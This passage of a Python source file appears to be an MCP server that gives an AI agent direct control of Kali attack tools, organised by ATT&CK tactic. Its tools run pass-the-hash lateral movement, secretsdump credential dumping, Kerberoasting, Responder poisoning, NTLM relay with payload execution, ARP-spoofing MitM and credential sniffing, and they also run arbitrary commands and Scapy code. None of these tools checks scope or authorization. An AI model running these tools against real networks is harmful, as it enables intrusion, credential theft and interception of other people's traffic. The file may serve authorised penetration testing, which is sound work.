    err = _require_file(cap_file, "cap_file")
    if err:
        return err
    cmd = ["aircrack-ng", cap_file, "-w", wordlist]
    if bssid.strip():
        cmd += ["-b", bssid.strip()]
    return _format(_run(cmd, timeout=600))


# ===========================================================================
# UTILITY / HEALTH
# ===========================================================================




@mcp.tool()
def wordlists_info() -> str:
    """[Utility] List available wordlists in /usr/share/wordlists."""
    result = subprocess.run(
        ["find", "/usr/share/wordlists", "-maxdepth", "3", "-type", "f"],
        capture_output=True, text=True,
    )
    files = sorted(result.stdout.strip().splitlines())
    return "\n".join(files) if files else "No wordlists found."


@mcp.tool()
def run_custom_command(command: str, timeout: int = 180) -> str:
    """[Utility] Execute any command safely (no shell — use carefully).

    The command string is tokenised with shlex and run directly via subprocess.
    Shell operators like | && ; > are NOT supported.

    Args:
        command: Full command string (e.g. "nmap -sV 10.10.10.1")
        timeout: Max seconds to wait (default: 180)
    """
    try:
        cmd = shlex.split(command)
    except ValueError as e:
        return f"Error parsing command: {e}"
    if not cmd:
        return "Error: empty command."
    return _format(_run(cmd, timeout=timeout))


# ===========================================================================
# TA0008 – LATERAL MOVEMENT
# ===========================================================================

@mcp.tool()
def evil_winrm(target: str, username: str, password: str = "",
               hash_val: str = "", port: int = 5985,
               extra_flags: str = "") -> str:
    """[TA0008 Lateral Movement] evil-winrm — WinRM shell for Windows targets.

    Authenticate via password or NTLM hash (Pass-the-Hash).

    Args:
        target: Target IP or hostname
        username: Windows username
        password: Password (leave empty if using hash)
        hash_val: NTLM hash for Pass-the-Hash (format: LM:NT or just NT)
        port: WinRM port (default: 5985, HTTPS: 5986)
        extra_flags: Additional evil-winrm flags (e.g. "-S" for SSL)
    """
    cmd = ["evil-winrm", "-i", target, "-u", username, "-P", str(port)]
    if hash_val.strip():
        cmd += ["-H", hash_val.strip()]
    elif password:
        cmd += ["-p", password]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def impacket_psexec(target: str, username: str, password: str = "",
                    hash_val: str = "", domain: str = "",
                    command: str = "whoami") -> str:
    """[TA0008 Lateral Movement] impacket-psexec — remote command execution via SMB/psexec.

    Args:
        target: Target IP or hostname
        username: Username
        password: Password (leave empty for hash auth)
        hash_val: NTLM hash for Pass-the-Hash (LM:NT format)
        domain: Windows domain (empty = WORKGROUP)
        command: Command to execute on remote system
    """
    auth = f"{domain}/{username}" if domain.strip() else username
    if hash_val.strip():
        auth_part = [f"{auth}@{target}", "-hashes", hash_val.strip()]
    else:
        auth_part = [f"{auth}:{password}@{target}"]
    cmd = ["impacket-psexec"] + auth_part + [command]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def impacket_smbexec(target: str, username: str, password: str = "",
                     hash_val: str = "", domain: str = "",
                     command: str = "whoami") -> str:
    """[TA0008 Lateral Movement] impacket-smbexec — stealthier SMB remote command execution.

    Uses a service-based approach, no binary dropped on disk by default.

    Args:
        target: Target IP or hostname
        username: Username
        password: Password (leave empty for hash auth)
        hash_val: NTLM hash (LM:NT format)
        domain: Windows domain (empty = WORKGROUP)
        command: Command to execute on remote system
    """
    auth = f"{domain}/{username}" if domain.strip() else username
    if hash_val.strip():
        auth_part = [f"{auth}@{target}", "-hashes", hash_val.strip()]
    else:
        auth_part = [f"{auth}:{password}@{target}"]
    cmd = ["impacket-smbexec"] + auth_part + [command]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def impacket_wmiexec(target: str, username: str, password: str = "",
                     hash_val: str = "", domain: str = "",
                     command: str = "whoami") -> str:
    """[TA0008 Lateral Movement] impacket-wmiexec — remote execution via WMI (no service install).

    Args:
        target: Target IP or hostname
        username: Username
        password: Password (leave empty for hash auth)
        hash_val: NTLM hash (LM:NT format)
        domain: Windows domain
        command: Command to run remotely
    """
    auth = f"{domain}/{username}" if domain.strip() else username
    if hash_val.strip():
        auth_part = [f"{auth}@{target}", "-hashes", hash_val.strip()]
    else:
        auth_part = [f"{auth}:{password}@{target}"]
    cmd = ["impacket-wmiexec"] + auth_part + [command]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def netexec_run(protocol: str, target: str, username: str = "",
                password: str = "", hash_val: str = "",
                domain: str = "", extra_flags: str = "") -> str:
    """[TA0008 Lateral Movement] netexec (nxc) — multi-protocol post-exploitation framework.

    Replaces CrackMapExec. Supports SMB, SSH, WinRM, LDAP, RDP, FTP, MSSQL.

    Args:
        protocol: smb | ssh | winrm | ldap | rdp | ftp | mssql
        target: Target IP, hostname, or CIDR range
        username: Username (empty = no auth)
        password: Password
        hash_val: NTLM hash for Pass-the-Hash
        domain: Windows domain
        extra_flags: Additional nxc flags (e.g. "--shares", "--users",
                     "--pass-pol", "-x whoami", "--sam", "--lsa")
    """
    cmd = ["netexec", protocol, target]
    if domain.strip():
        cmd += ["-d", domain.strip()]
    if username.strip():
        cmd += ["-u", username.strip()]
    if hash_val.strip():
        cmd += ["-H", hash_val.strip()]
    elif password:
        cmd += ["-p", password]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def xfreerdp_connect(target: str, username: str, password: str = "",
                     domain: str = "", port: int = 3389,
                     extra_flags: str = "/cert:ignore") -> str:
    """[TA0008 Lateral Movement] xfreerdp3 — RDP client connection (headless info-only mode).

    Note: GUI sessions require a display. This tool runs xfreerdp with /v flag
    to attempt connection and capture negotiation output (useful to verify credentials).

    Args:
        target: Target IP or hostname
        username: RDP username
        password: RDP password
        domain: Windows domain (optional)
        port: RDP port (default: 3389)
        extra_flags: Additional xfreerdp flags (e.g. "/cert:ignore /sec:nla")
    """
    cmd = [
        "xfreerdp3",
        f"/v:{target}:{port}",
        f"/u:{username}",
    ]
    if password:
        cmd.append(f"/p:{password}")
    if domain.strip():
        cmd.append(f"/d:{domain.strip()}")
    cmd += shlex.split(extra_flags)
    # Run briefly to check connectivity/auth (not a full GUI session)
    return _format(_run(cmd, timeout=15))


@mcp.tool()
def impacket_secretsdump(target: str, username: str, password: str = "",
                         hash_val: str = "", domain: str = "",
                         extra_flags: str = "") -> str:
    """[TA0008 Lateral Movement] impacket-secretsdump — dump SAM, LSA secrets, NTDS.dit hashes.

    Args:
        target: Target IP or hostname
        username: Username with admin rights
        password: Password (leave empty for hash auth)
        hash_val: NTLM hash (LM:NT format)
        domain: Windows domain
        extra_flags: Additional flags (e.g. "-just-dc-ntlm", "-just-dc-user administrator")
    """
    auth = f"{domain}/{username}" if domain.strip() else username
    if hash_val.strip():
        auth_part = [f"{auth}@{target}", "-hashes", hash_val.strip()]
    else:
        auth_part = [f"{auth}:{password}@{target}"]
    cmd = ["impacket-secretsdump"] + auth_part + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def rdesktop_connect(target: str, username: str, password: str = "",
                     domain: str = "", port: int = 3389) -> str:
    """[TA0008 Lateral Movement] rdesktop — legacy RDP client (useful for older Windows).

    Args:
        target: Target IP or hostname
        username: RDP username
        password: RDP password
        domain: Windows domain (optional)
        port: RDP port (default: 3389)
    """
    cmd = ["rdesktop", f"-u", username, f"-p", password or ""]
    if domain.strip():
        cmd += ["-d", domain.strip()]
    cmd += [f"{target}:{port}"]
    return _format(_run(cmd, timeout=15))


# ===========================================================================
# TA0007 – DISCOVERY (extended)
# ===========================================================================

@mcp.tool()
def netdiscover_scan(interface: str = "eth0", range_cidr: str = "",
                     passive: bool = False) -> str:
    """[TA0007 Discovery] netdiscover — ARP-based host discovery on local networks.

    Args:
        interface: Network interface (e.g. eth0, wlan0)
        range_cidr: Target IP range (e.g. 192.168.1.0/24). Empty = scan default gateways
        passive: True = passive sniffing mode (no ARP requests sent)
    """
    cmd = ["netdiscover", "-i", interface]
    if range_cidr.strip():
        cmd += ["-r", range_cidr.strip()]
    if passive:
        cmd.append("-p")
    cmd += ["-c", "3"]  # 3 scan counts then exit
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def arping_scan(target: str, interface: str = "", count: int = 4) -> str:
    """[TA0007 Discovery] arping — ARP ping to discover/verify hosts on local network.

    Args:
        target: Target IP address
        interface: Network interface (e.g. eth0). Empty = auto-detect
        count: Number of ARP requests to send
    """
    cmd = ["arping", "-c", str(count)]
    if interface.strip():
        cmd += ["-I", interface.strip()]
    cmd.append(target)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def fping_sweep(targets: str, extra_flags: str = "-a -g") -> str:
    """[TA0007 Discovery] fping — fast ICMP ping sweep across multiple hosts/ranges.

    Args:
        targets: IP, range, or CIDR (e.g. "192.168.1.1-254" or "10.10.10.0/24")
        extra_flags: fping flags (default: -a show alive, -g generate range)
    """
    cmd = ["fping"] + shlex.split(extra_flags) + shlex.split(targets)
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def fierce_dns(domain: str, extra_flags: str = "") -> str:
    """[TA0007 Discovery] fierce — DNS reconnaissance and subdomain brute-force.

    Args:
        domain: Target domain (e.g. example.com)
        extra_flags: Additional flags (e.g. "--wordlist /usr/share/wordlists/dirb/common.txt")
    """
    cmd = ["fierce", "--domain", domain] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=120))


@mcp.tool()
def nbtscan_scan(target: str, extra_flags: str = "") -> str:
    """[TA0007 Discovery] nbtscan — NetBIOS name scanner for Windows host discovery.

    Args:
        target: IP, hostname, or CIDR range (e.g. 192.168.1.0/24)
        extra_flags: Additional nbtscan flags (e.g. "-v" verbose, "-r" use port 137)
    """
    cmd = ["nbtscan"] + shlex.split(extra_flags) + [target]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def smbmap_scan(target: str, username: str = "", password: str = "",
                hash_val: str = "", domain: str = "",
                extra_flags: str = "") -> str:
    """[TA0007 Discovery] smbmap — enumerate SMB shares, permissions, and files.

    Args:
        target: Target IP or hostname
        username: Username (empty = anonymous/guest)
        password: Password
        hash_val: NTLM hash (format: LM:NT)
        domain: Windows domain
        extra_flags: Additional flags (e.g. "-R" recursive, "-d" list dirs,
                     "--download 'C$\\path\\file'")
    """
    cmd = ["smbmap", "-H", target]
    if domain.strip():
        cmd += ["-d", domain.strip()]
    if username.strip():
        cmd += ["-u", username.strip()]
    if hash_val.strip():
        cmd += ["-p", hash_val.strip()]
    elif password:
        cmd += ["-p", password]
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def onesixtyone_snmp(target: str,
                     community_file: str = "/usr/share/wordlists/metasploit/snmp_default_pass.txt",
                     extra_flags: str = "") -> str:
    """[TA0007 Discovery] onesixtyone — fast SNMP community string brute-force scanner.

    Args:
        target: Target IP or CIDR range
        community_file: Path to SNMP community string wordlist
        extra_flags: Additional flags
    """
    cmd = ["onesixtyone", "-c", community_file] + shlex.split(extra_flags) + [target]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def snmpwalk_enum(target: str, community: str = "public",
                  oid: str = "1.3.6.1.2.1", version: str = "2c") -> str:
    """[TA0007 Discovery] snmpwalk — enumerate SNMP tree on a target.

    Args:
        target: Target IP or hostname
        community: SNMP community string (default: public)
        oid: Starting OID (default: 1.3.6.1.2.1 = mib-2 subtree)
        version: SNMP version: 1, 2c, or 3
    """
    cmd = ["snmpwalk", "-v", version, "-c", community, target, oid]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def tcpdump_capture(interface: str = "eth0", filter_expr: str = "",
                    count: int = 100, output_file: str = "") -> str:
    """[TA0007 Discovery] tcpdump — capture and display network packets.

    Args:
        interface: Network interface to capture on (e.g. eth0, any)
        filter_expr: BPF filter expression (e.g. "port 80", "host 10.10.10.1",
                     "tcp and port 443")
        count: Number of packets to capture then exit (default: 100)
        output_file: Absolute path to save .pcap file (empty = print to stdout)
    """
    cmd = ["tcpdump", "-i", interface, "-c", str(count), "-nn"]
    if filter_expr.strip():
        cmd += shlex.split(filter_expr)
    if output_file.strip():
        if not os.path.isabs(output_file):
            return "Error: output_file must be an absolute path."
        cmd += ["-w", output_file.strip()]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def hping3_probe(target: str, mode: str = "--tcp", port: int = 80,
                 count: int = 5, extra_flags: str = "") -> str:
    """[TA0007 Discovery] hping3 — advanced TCP/IP packet crafting and host probing.

    Args:
        target: Target IP or hostname
        mode: Probe mode: --tcp, --udp, --icmp, --syn, --ack, --fin, --rst
        port: Target port (default: 80)
        count: Number of packets to send
        extra_flags: Additional hping3 flags (e.g. "--traceroute", "-V" verbose,
                     "--flood" for stress test)
    """
    cmd = ["hping3", mode, "-p", str(port), "-c", str(count)] + shlex.split(extra_flags) + [target]
    return _format(_run(cmd, timeout=60))


# ===========================================================================
# TA0006 – CREDENTIAL ACCESS (extended — Kerberos / AD attacks)
# ===========================================================================

@mcp.tool()
def impacket_getuserspns(target: str, username: str, password: str = "",
                         hash_val: str = "", domain: str = "",
                         request: bool = True) -> str:
    """[TA0006 Credential Access] impacket-GetUserSPNs — Kerberoasting (extract TGS tickets).

    Finds user accounts with SPNs set and requests TGS tickets for offline cracking.

    Args:
        target: Domain Controller IP or hostname
        username: Domain username for authentication
        password: Password (leave empty for hash auth)
        hash_val: NTLM hash (LM:NT format)
        domain: Active Directory domain (e.g. corp.local)
        request: True = request and output crackable TGS hashes
    """
    auth = f"{domain}/{username}" if domain.strip() else username
    if hash_val.strip():
        cmd = ["impacket-GetUserSPNs", f"{auth}@{target}", "-hashes", hash_val.strip()]
    else:
        cmd = ["impacket-GetUserSPNs", f"{auth}:{password}@{target}"]
    if request:
        cmd.append("-request")
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def impacket_getnpusers(target: str, domain: str, userlist: str = "",
                        username: str = "", password: str = "",
                        hash_val: str = "") -> str:
    """[TA0006 Credential Access] impacket-GetNPUsers — AS-REP Roasting.

    Finds users with Kerberos pre-auth disabled and extracts AS-REP hashes.

    Args:
        target: Domain Controller IP or hostname
        domain: Active Directory domain (e.g. corp.local)
        userlist: Absolute path to username list (for unauthenticated enumeration)
        username: Authenticated username (optional — skip for null session)
        password: Password
        hash_val: NTLM hash (LM:NT format)
    """
    if userlist.strip():
        err = _require_file(userlist, "userlist")
        if err:
            return err
        cmd = ["impacket-GetNPUsers", f"{domain}/", "-usersfile", userlist,
               "-dc-ip", target, "-no-pass"]
    else:
        auth = f"{domain}/{username}" if username.strip() else f"{domain}/"
        if hash_val.strip():
            cmd = ["impacket-GetNPUsers", f"{auth}@{target}", "-hashes", hash_val.strip(),
                   "-dc-ip", target]
        else:
            credential = f"{auth}:{password}@{target}" if password else f"{auth}@{target}"
            cmd = ["impacket-GetNPUsers", credential, "-dc-ip", target]
    return _format(_run(cmd, timeout=60))


@mcp.tool()
def impacket_getadusers(target: str, username: str, password: str = "",
                        hash_val: str = "", domain: str = "",
                        all_users: bool = True) -> str:
    """[TA0006 Credential Access] impacket-GetADUsers — enumerate Active Directory users.

    Args:
        target: Domain Controller IP or hostname
        username: Domain username
        password: Password (leave empty for hash auth)
        hash_val: NTLM hash (LM:NT format)
        domain: Active Directory domain
        all_users: True = include all users (including disabled), False = only enabled
    """
    auth = f"{domain}/{username}" if domain.strip() else username
    if hash_val.strip():
        cmd = ["impacket-GetADUsers", f"{auth}@{target}", "-hashes", hash_val.strip()]
    else:
        cmd = ["impacket-GetADUsers", f"{auth}:{password}@{target}"]
    if all_users:
        cmd.append("-all")
    return _format(_run(cmd, timeout=60))


# ===========================================================================
# TA0005 – DEFENSE EVASION / NETWORK ATTACK (MitM, Poisoning, Sniffing)
# ===========================================================================

@mcp.tool()
def responder_run(interface: str = "eth0", extra_flags: str = "-rdw") -> str:
    """[TA0005 Network Attack] Responder — LLMNR/NBT-NS/mDNS poisoning to capture NTLM hashes.

    Poisons name resolution requests to capture Net-NTLMv2 hashes.
    Note: Requires root/sudo. Run in a terminal for interactive use.

    Args:
        interface: Network interface to listen on (e.g. eth0, wlan0)
        extra_flags: Responder flags (default: -rdw = SMB/HTTP/WPAD on)
                     Add "-v" for verbose, "-A" for analyze mode (no poisoning)
    """
    cmd = ["responder", "-I", interface] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def impacket_ntlmrelayx(target: str, smb2support: bool = True,
                         extra_flags: str = "") -> str:
    """[TA0005 Network Attack] impacket-ntlmrelayx — NTLM relay attack.

    Relay captured NTLM authentication to other services.
    Commonly used with Responder (turn off SMB/HTTP in Responder first).

    Args:
        target: Target IP or file with targets (e.g. 10.10.10.1 or /tmp/targets.txt)
        smb2support: Enable SMBv2 support
        extra_flags: Additional flags (e.g. "-c whoami", "--no-http-server",
                     "-e /tmp/payload.exe", "-socks" for SOCKS proxy)
    """
    cmd = ["impacket-ntlmrelayx", "-t", target]
    if smb2support:
        cmd.append("--smb2support")
    cmd += shlex.split(extra_flags)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def arpspoof_attack(interface: str, target: str, gateway: str) -> str:
    """[TA0005 Network Attack] arpspoof — ARP spoofing / Man-in-the-Middle.

    Poisons the ARP cache of target and gateway for traffic interception.
    Note: Enable IP forwarding first: echo 1 > /proc/sys/net/ipv4/ip_forward

    Args:
        interface: Network interface (e.g. eth0)
        target: Victim IP address
        gateway: Gateway/router IP address
    """
    cmd = ["arpspoof", "-i", interface, "-t", target, gateway]
    return _format(_run(cmd, timeout=15))


@mcp.tool()
def ettercap_mitm(interface: str, target1: str, target2: str,
                  extra_flags: str = "-T -q") -> str:
    """[TA0005 Network Attack] ettercap — MitM, sniffing, and protocol dissection.

    Args:
        interface: Network interface (e.g. eth0)
        target1: First target IP (victim, format: IP/port or IP/ for all ports)
        target2: Second target IP (gateway, format: IP/ for all ports)
        extra_flags: ettercap flags (default: -T text, -q quiet)
                     Add "-M arp:remote" for ARP MitM (default mode)
    """
    cmd = [
        "ettercap", "-i", interface,
        "-M", "arp:remote",
        f"/{target1}/", f"/{target2}/",
    ] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def dsniff_capture(interface: str = "eth0", extra_flags: str = "") -> str:
    """[TA0005 Network Attack] dsniff — passive credential sniffing from network traffic.

    Captures plaintext passwords from FTP, Telnet, HTTP, IMAP, POP3, etc.
    Note: Requires root. Best used with ARP spoofing (arpspoof_attack).

    Args:
        interface: Network interface to sniff on
        extra_flags: Additional dsniff flags (e.g. "-m" automatic decoding)
    """
    cmd = ["dsniff", "-i", interface] + shlex.split(extra_flags)
    return _format(_run(cmd, timeout=30))


@mcp.tool()
def scapy_probe(script: str) -> str:
    """[TA0005 Network Attack] scapy — execute a custom Scapy Python snippet for packet crafting.

    Runs a one-liner Scapy command non-interactively.
    Example: "ans,unans = sr(IP(dst='10.10.10.1')/ICMP(), timeout=2); ans.show()"

    Args:
        script: Python/Scapy code to execute (single expression or statement)
    """
    full_script = f"from scapy.all import *\n{script}\n"
    result = subprocess.run(
        ["python3", "-c", full_script],
        capture_output=True, text=True, timeout=30,
    )
    return _format({"stdout": result.stdout, "stderr": result.stderr,
                    "returncode": result.returncode})


# ===========================================================================
# Update list_installed_tools to include new categories
# ===========================================================================

@mcp.tool()
def list_installed_tools() -> str:
    """[Utility] Check which Kali tools are installed, organized by ATT&CK tactic."""
    categories = {
        "TA0043 Reconnaissance": [
            "nmap", "masscan", "gobuster", "ffuf", "feroxbuster", "wfuzz", "dirb",
            "nikto", "whatweb", "wapiti", "dnsenum", "dnsrecon", "theHarvester",
            "amass", "recon-ng", "legion", "zenmap", "dig", "whois", "shodan",
        ],
        "TA0042 Resource Development": [
            "searchsploit", "msfvenom", "radare2", "pyinstaller",
            "clang", "clang++", "msf-nasm_shell", "weevely", "jadx",
        ],
        "TA0001 Initial Access": [
            "sqlmap", "commix", "hydra", "medusa", "gophish",
        ],
        "TA0002 Execution": [
            "msfconsole", "setoolkit",
        ],
        "TA0003 Persistence": [
            "weevely", "laudanum",
        ],
        "TA0004 Privilege Escalation": [
            "linpeas", "winpeas", "peass", "unix-privesc-check",
        ],
        "TA0005 Network Attack (MitM/Poison)": [
            "responder", "impacket-ntlmrelayx", "arpspoof", "ettercap",
            "dsniff", "scapy",
        ],
        "TA0006 Credential Access": [
            "john", "hashcat", "hashid",
            "impacket-GetUserSPNs", "impacket-GetNPUsers", "impacket-GetADUsers",
            "impacket-secretsdump",
        ],
        "TA0007 Discovery": [
            "enum4linux", "smbclient", "rpcclient", "smbmap",
            "netdiscover", "arping", "fping", "fierce", "nbtscan",
            "onesixtyone", "snmpwalk", "tcpdump", "hping3",
        ],
        "TA0008 Lateral Movement": [
            "evil-winrm", "impacket-psexec", "impacket-smbexec",
            "impacket-wmiexec", "netexec", "xfreerdp3", "rdesktop",
            "impacket-secretsdump",
        ],
        "TA0009 Collection / Vuln Scanning": [
            "nuclei", "openvas",
        ],
        "TA0011 Wireless / C2": [
            "aircrack-ng", "airmon-ng", "airodump-ng",
        ],
        "Utilities": [
            "netcat", "nc", "curl", "wget", "python3", "perl", "ruby",
        ],
    }
    lines = []
    for cat, tools in categories.items():
        lines.append(f"\n[{cat}]")
        for tool in tools:
            r = subprocess.run(["which", tool], capture_output=True, text=True)
            status = r.stdout.strip() if r.returncode == 0 else "NOT FOUND"
            lines.append(f"  {tool:<30} {status}")
    return "\n".join(lines)


# ===========================================================================
# Entry point
# ===========================================================================

if __name__ == "__main__":
    print("Starting Kali MCP server on http://127.0.0.1:5000/mcp")
    mcp.run(transport="streamable-http")
